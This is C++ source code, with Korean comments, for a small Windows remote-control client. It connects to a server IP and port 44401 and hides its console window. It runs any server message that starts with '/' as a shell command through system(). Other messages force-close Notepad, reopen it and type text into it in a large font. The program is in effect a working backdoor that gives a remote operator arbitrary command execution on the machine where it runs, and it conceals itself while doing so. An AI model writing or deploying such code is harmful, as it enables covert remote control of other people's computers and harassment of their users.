#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <conio.h>
#include <tlhelp32.h>

#define BUFF_SIZE 2000
#define TYPING_DELAY 150

using namespace std;

HANDLE h_notepad, h_edit;

void ResetNotepad()
{
    h_notepad = FindWindow("Notepad", NULL);
    while(!h_notepad)
    {
        cout << "메모장 핸들" << endl;
        Sleep(150);
        h_notepad = FindWindow("Notepad", NULL);
    }

    h_edit = FindWindowEx(h_notepad, NULL, "Edit", NULL);
    while(!h_edit)
        h_edit = FindWindowEx(h_notepad, NULL, "Edit", NULL);
}
DWORD FindProcessID(LPCTSTR szProcessName)
{
    DWORD dwPID = -1;
    HANDLE hSnapShot = INVALID_HANDLE_VALUE;
    PROCESSENTRY32 pe;

    pe.dwSize = sizeof(PROCESSENTRY32);
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

    Process32First(hSnapShot, &pe);
    do
    {
        if(!_stricmp(szProcessName, pe.szExeFile))
        {
            dwPID = pe.th32ProcessID;
            break;
        }
    }
    while(Process32Next(hSnapShot, &pe));

    CloseHandle(hSnapShot);

    return dwPID;
}
void ChangeFont(int font_size, const char* font_name)
{
    HDC hdc = GetDC(h_edit);
    LOGFONT lf;
    memset(&lf, 0, sizeof(LOGFONT));

    lf.lfHeight=font_size;
    lf.lfWidth=0;
    lf.lfEscapement=0;
    lf.lfOrientation=0;
    lf.lfWeight=0;
    lf.lfItalic=0;
    lf.lfUnderline=0;
    lf.lfStrikeOut=0;
    lf.lfCharSet=HANGEUL_CHARSET;
    lf.lfOutPrecision=0;
    lf.lfClipPrecision=0;
    lf.lfQuality=0;
    lf.lfPitchAndFamily=0;
    strcpy(lf.lfFaceName, font_name);

    HFONT Font=CreateFontIndirect(&lf);
    PostMessage(h_edit, WM_SETFONT, Font, 1); // note: WM_SETFONT메세지 보내야 한다는거 구글에도 안나와 있어서 직접 리버싱하면서 알아냄 ㅠㅠ

    ReleaseDC(h_edit, hdc);
}
int main()
{

    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        cerr << "초기화 실패. 에러코드: %d" << WSAGetLastError();
        getch();
        return 1;
    }

    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        cerr << "소켓 생성 실패 : " << WSAGetLastError();
        WSACleanup();
        getch();
        return 1;
    }

    char IP[30] = "";
    cout << "IP : ";
    cin >> IP;

    server.sin_addr.s_addr = inet_addr(IP);
    server.sin_family = AF_INET;
    server.sin_port = htons(44401);

    ShowWindow(GetForegroundWindow(), SW_HIDE);

    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        cerr << "연결 실패.";

        switch(WSAGetLastError())
        {
        case 2:
            cout << "서버가 없습니다." << endl;
            break;

        case 10060:
            cout << "서버 연결이 너무 오래결려 연결을 중단했습니다." << endl;
            break;

        default:
            cout << "에러코드: " << WSAGetLastError() << endl;
        }
        closesocket(s);
        WSACleanup();
        getch();
        return 1;
    }

    cout << "성공" << endl;

    system("taskkill /im notepad.exe -f");

    while(TRUE)
    {
        char buff_recv[BUFF_SIZE] = "";
        int len = 0;
        if(recv(s, buff_recv, BUFF_SIZE, 0) < 0)
        {
            system("cls");
            cerr << "서버와의 연결이 끊어졌습니다." << endl;
            closesocket(s);
            exit(1);
        }
        switch(buff_recv[0])
        {
        case '/': // CMD명령 실행
            system(buff_recv + 1);
            break;

        case '*': // 큰 글씨로 메모장 메시지 전송

            system("taskkill -f /im notepad.exe");
            system("start notepad"); // 다시 실행

            ResetNotepad(); // 핸들값 초기화
            ChangeFont(100, "궁서");

            len = strlen(buff_recv + 1);

            for(int i = 0;i < len;i++) // 서버에서 보낸 문자열을 하나씩 출력함
            {
                PostMessage(h_edit, WM_CHAR, (buff_recv + 1)[i], NULL);
                Sleep(TYPING_DELAY);
                cout << "WM_CHAR 메시지 보냄" << endl;
            }
            PostMessage(h_edit, WM_CHAR, '\n', NULL);
            break;
        default: // 메모장 메시지 전송

            system("taskkill -f /im notepad.exe");
            system("start notepad"); // 다시 실행

            ResetNotepad(); // 핸들값 초기화
            ChangeFont(21, "맑은 고딕");

            len = strlen(buff_recv);

            for(int i = 0;i < len;i++) // 서버에서 보낸 문자열을 하나씩 출력함
            {
                PostMessage(h_edit, WM_CHAR, buff_recv[i], NULL);
                Sleep(TYPING_DELAY);
                cout << "WM_CHAR 메시지 보냄" << endl;
            }
            PostMessage(h_edit, WM_CHAR, '\n', NULL);
        }
        memset(buff_recv, 0, BUFF_SIZE);
    }
}
